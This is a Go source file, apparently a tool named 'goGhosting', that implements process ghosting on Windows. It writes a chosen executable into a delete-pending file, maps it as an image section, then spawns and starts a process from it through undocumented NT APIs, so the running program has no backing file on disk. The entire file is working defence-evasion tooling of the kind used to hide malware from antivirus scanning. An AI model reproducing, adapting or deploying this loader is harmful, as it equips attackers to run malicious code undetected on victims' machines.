package main

import (
	"debug/pe"
	"fmt"
	"github.com/JamesHovious/w32"
	"goGhosting/winApi"
	"io/ioutil"
	"os"
	"strings"
	"syscall"
	"unsafe"
)

func getEntryPoint(fileName string) uint32 {
	peFile, _ := pe.Open(fileName)
	var entryPoint uint32
	switch fileType := peFile.OptionalHeader.(type) {
	case *pe.OptionalHeader32:
		entryPoint = fileType.AddressOfEntryPoint
	case *pe.OptionalHeader64:
		entryPoint = fileType.AddressOfEntryPoint
	default:
		return 0
	}
	return entryPoint
}

func writeRemoteMem(hProcess w32.HANDLE, source []byte, dst uintptr, size uint, Protect uint32) bool {
	err := w32.WriteProcessMemory(hProcess, dst, source, size)
	if err != nil {
		return false
	}

	var oldProtect w32.DWORD = 0
	virPro := winApi.ProcVirtualProtectEx(hProcess, w32.PVOID(dst), w32.SIZE_T(size), w32.PAGE_READWRITE, &oldProtect)
	if virPro != 1 {
		return false
	}

	return true
}

func SetupProcessParameters(processHandle w32.HANDLE, targetPath string) bool {
	winDir := os.Getenv("windir")

	Data1 := winDir + "\\System32"
	unicodeStruct1 := w32.UNICODE_STRING{}
	unicodeStruct1.Length = uint16(strings.Count(Data1, "")-1) * 2
	unicodeStruct1.MaximumLength = unicodeStruct1.Length + 1
	temp1, _ := syscall.UTF16FromString(Data1)
	unicodeStruct1.Buffer = &temp1[0]

	Data2 := targetPath
	unicodeStruct2 := w32.UNICODE_STRING{}
	unicodeStruct2.Length = uint16(strings.Count(Data2, "")-1) * 2
	unicodeStruct2.MaximumLength = unicodeStruct2.Length + 1
	temp2, _ := syscall.UTF16FromString(Data2)
	unicodeStruct2.Buffer = &temp2[0]

	Data3 := ""
	unicodeStruct3 := w32.UNICODE_STRING{}
	unicodeStruct3.Length = uint16(strings.Count(Data3, "")-1) * 2
	unicodeStruct3.MaximumLength = unicodeStruct3.Length + 1
	temp3, _ := syscall.UTF16FromString(Data3)
	unicodeStruct3.Buffer = &temp3[0]

	uSystemDir := &unicodeStruct1
	uLaunchPath := &unicodeStruct2
	uWindowName := &unicodeStruct3
	var environment w32.PVOID = nil
	var pProcessParams uintptr

	rtlCreate := winApi.ProcRtlCreateProcessParametersEx(&pProcessParams, uLaunchPath, uSystemDir, uSystemDir, uLaunchPath, environment, uWindowName, nil, nil, nil, 1)
	if rtlCreate != 0 {
		fmt.Println("[!] RtlCreateProcessParametersEx() is failed !!!")
		return false
	}

	iProcessParamsSize := *(*uint32)(unsafe.Pointer(uintptr(pProcessParams) + 4))

	_, err := w32.VirtualAllocEx(processHandle, int(pProcessParams), int(iProcessParamsSize), 0x3000, w32.PAGE_READWRITE)
	if err != nil {
		fmt.Println("[!] VirtualAllocEx() is failed !!!")
		return false
	}

	pProcessParamsByte := make([]byte, iProcessParamsSize)
	for i := 0; i < int(iProcessParamsSize); i++ {
		pProcessParamsByte[i] = *(*byte)(unsafe.Pointer(pProcessParams + uintptr(i)))
	}

	isWriteSucc := writeRemoteMem(processHandle, pProcessParamsByte, pProcessParams, uint(iProcessParamsSize), w32.PAGE_READWRITE)
	if !isWriteSucc {
		fmt.Println("[!] Writing the process params is failed !!!")
		return false
	}

	tempByte := *(*[8]byte)(unsafe.Pointer(&pProcessParams))
	pProcessParamsByte2 := make([]byte, 8)
	for i, j := range tempByte {
		pProcessParamsByte2[i] = j
	}

	isWriteSucc2 := writeRemoteMem(processHandle, pProcessParamsByte2, (PBI(processHandle).PebBaseAddress + 0x20), 0x8, w32.PAGE_READWRITE)
	if !isWriteSucc2 {
		fmt.Println("[!] Writing the process params's ptr is failed !!!")
		return false
	}
	return true

}

func fechPEB(hProcess w32.HANDLE) uintptr {
	var PBI winApi.PROCESS_BASE_INFORMATION = winApi.PROCESS_BASE_INFORMATION{}
	pbi_size := unsafe.Sizeof(PBI)
	var written uint32 = 0
	_ = winApi.ProcNtQueryInformationProcess(hProcess, 0, &PBI, uint32(pbi_size), w32.ULONG_PTR(unsafe.Pointer(&written)))
	var pebBytes [0x40]byte
	var numReaded uint32 = 0
	ntRead := winApi.ProcNtReadVirtualMemory(hProcess, w32.PVOID((PBI.PebBaseAddress)), w32.PVOID((&pebBytes)), 0x40, &numReaded)
	if ntRead != 0 {
		fmt.Println("[!] NtReadVirtualMemory() is failed !!!")
		os.Exit(1)
	}
	return *(*uintptr)(unsafe.Pointer(uintptr(unsafe.Pointer(&pebBytes)) + 0x10))
}

func PBI(processHandle w32.HANDLE) winApi.PROCESS_BASE_INFORMATION {
	var PBI winApi.PROCESS_BASE_INFORMATION = winApi.PROCESS_BASE_INFORMATION{}
	pbi_size := unsafe.Sizeof(PBI)
	var written uint32 = 0
	_ = winApi.ProcNtQueryInformationProcess(processHandle, 0, &PBI, uint32(pbi_size), w32.ULONG_PTR(unsafe.Pointer(&written)))

	return PBI
}

func main() {

	if os.Args[1] != "-real" {
		fmt.Println("-real: the real executable you wish to spawn. [REQUIRED]\n-fake: the fake file's Absolute Address(The parent directory must exist). [REQUIRED]")
		os.Exit(2)
	}

	if os.Args[3] != "-fake" {
		fmt.Println("-real: the real executable you wish to spawn. [REQUIRED]\n-fake: the fake file's Absolute Address(The parent directory must exist). [REQUIRED]")
		os.Exit(2)
	} else {
		_, err := os.Stat(os.Args[4])
		if err == nil {
			fmt.Println("[~] The fake file may existed.")
			os.Exit(2)
		}
	}

	fakeFileName := os.Args[4]
	realFileName := os.Args[2]

	fileHandle, _ := w32.CreateFile(fakeFileName, w32.GENERIC_READ|w32.GENERIC_WRITE|w32.SYNCHRONIZE|0x10000, w32.FILE_SHARE_WRITE|w32.FILE_SHARE_READ, nil, w32.OPEN_ALWAYS, 0, w32.HANDLE(0))

	if fileHandle != 0 {
		fmt.Println("[*] CreateFile() is successful !!!")
	} else {
		fmt.Println("[!] CreateFile() is failed !!!")
		os.Exit(1)
	}

	realFile, _ := ioutil.ReadFile(realFileName)
	entryPoint := getEntryPoint(realFileName)

	var writeLen uint32 = 1
	var overlap w32.OVERLAPPED = w32.OVERLAPPED{}

	isSuccess, _ := w32.WriteFile(fileHandle, realFile, &writeLen, &overlap)
	if isSuccess {
		fmt.Println("[*] WriteFile() is successful !!!")
	} else {
		fmt.Println("[!] WriteFile() is failed !!!")
		os.Exit(1)
	}

	FDI := winApi.FILE_DISPOSITION_INFO{true}
	if !winApi.ProcSetFileInformationByHandle(fileHandle, winApi.FileDispositionInfo, &FDI, w32.DWORD(unsafe.Sizeof(FDI))) {
		fmt.Println("[!] SetFileInformationByHandle() is failed !!!")
		os.Exit(1)
	} else {
		fmt.Println("[*] SetFileInformationByHandle() is successful !!!")
	}

	sectionHandle := w32.HANDLE(0)
	var maxSize uint64 = 0
	res := winApi.ProcNtCreateSection(&sectionHandle, 0x0F001F, nil, &maxSize, 0x02, 0x1000000, fileHandle)

	if res == 0 {
		fmt.Println("[*] NtCreateSection() is successful !!!")
	} else {
		fmt.Println("[!] NtCreateSection() is failed !!!")
		os.Exit(1)
	}

	winApi.NtClose.Call(uintptr(fileHandle))
	processHandle := w32.HANDLE(0)
	currentProcessHandle, _ := syscall.GetCurrentProcess()
	nCreate := winApi.ProcNtCreateProcess(&processHandle, 0x001F0FFF, nil, w32.HANDLE(currentProcessHandle), 4, sectionHandle, w32.HANDLE(0), w32.HANDLE(0), 0)

	if nCreate == 0 {
		fmt.Println("[*] NtCreateProcess() is successful !!!")
	} else {
		fmt.Println("[!] NtCreateProcess() is failed !!!")
		os.Exit(1)
	}

	if !SetupProcessParameters(processHandle, fakeFileName) {
		fmt.Println("[!] Seting process's parameters is failed !!!")
		os.Exit(1)
	} else {
		fmt.Println("[*] Seting process's parameters is successful !!!")
	}

	var threadHandle w32.HANDLE
	procEntry := uintptr(entryPoint) + fechPEB(processHandle)
	ntCreateThread := winApi.ProcNtCreateThreadEx(&threadHandle, 2097151, nil, processHandle, unsafe.Pointer(procEntry), nil, 0, 0, 0, 0, nil)

	if ntCreateThread != 0 {
		fmt.Println("[!] NtCreateThreadEx() is failed !!!")
		os.Exit(1)
	} else {
		fmt.Println("[*] NtCreateThreadEx() is successful !!!")
		_, _ = w32.WaitForSingleObject(threadHandle, 0xffffffff)
	}

}
